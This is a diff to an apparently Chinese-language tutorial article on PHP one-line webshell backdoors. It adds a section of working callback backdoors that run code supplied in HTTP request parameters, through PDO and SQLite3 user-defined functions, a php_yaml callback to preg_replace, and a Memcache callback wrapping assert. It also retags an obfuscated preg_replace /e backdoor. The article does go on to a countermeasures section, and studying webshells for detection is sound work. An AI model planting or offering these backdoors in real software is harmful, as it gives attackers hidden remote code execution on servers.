@@ -329,7 +329,7 @@ AddType application/x-httpd-php .htaccess
 
 ## 9.高级的PHP一句话木马后门
 
-```
+```php
 1、
 $hh = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
 $hh("/[discuz]/e",$_POST['h'],"Access");
@@ -374,7 +374,58 @@ $gzid("/[discuz]/e",$_POST['h'],"Access");
 //绕过<?限制的一句话
 ```
 
-## 10.如何应对PHP一句话后门
+## 10. 数据库操作与第三方库中的回调后门
+
+```php
+<?php
+$e = $_REQUEST['e'];
+$db = new PDO('sqlite:sqlite.db3');
+$db->sqliteCreateFunction('myfunc', $e, 1);
+$sth = $db->prepare("SELECT myfunc(:exec)");
+$sth->execute(array(':exec' => $_REQUEST['pass']));
+```
+
+![](https://ws1.sinaimg.cn/large/b6de3d7dgy1fz8ksaearvj20hb0dhjs5.jpg)
+
+上面的sqlite方法是依靠PDO执行的，我们也可以直接调用sqlite3的方法构造回调后门：
+
+```php
+<?php
+$e = $_REQUEST['e'];
+$db = new SQLite3('sqlite.db3');
+$db->createFunction('myfunc', $e);
+$stmt = $db->prepare("SELECT myfunc(?)");
+$stmt->bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);
+$stmt->execute();
+```
+
+前提是php5.3以上。如果是php5.3以下的，使用sqlite_*函数，自己研究我不列出了。
+
+这两个回调后门，都是依靠php扩展库（pdo和sqlite3）来实现的。其实如果目标环境中有特定扩展库的情况下，也可以来构造回调后门。
+
+比如php_yaml：
+
+```php
+<?php
+$str = urlencode($_REQUEST['pass']);
+$yaml = <<<EOD
+greeting: !{$str} "|.+|e"
+EOD;
+$parsed = yaml_parse($yaml, 0, $cnt, array("!{$_REQUEST['pass']}" => 'preg_replace'));
+```
+
+还有php_memcached：
+
+```php
+<?php
+$mem = new Memcache();
+$re = $mem->addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));
+$mem->connect($_REQUEST['pass'], 11211, 0);
+```
+
+
+
+## 11.如何应对PHP一句话后门
 
 我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：
 
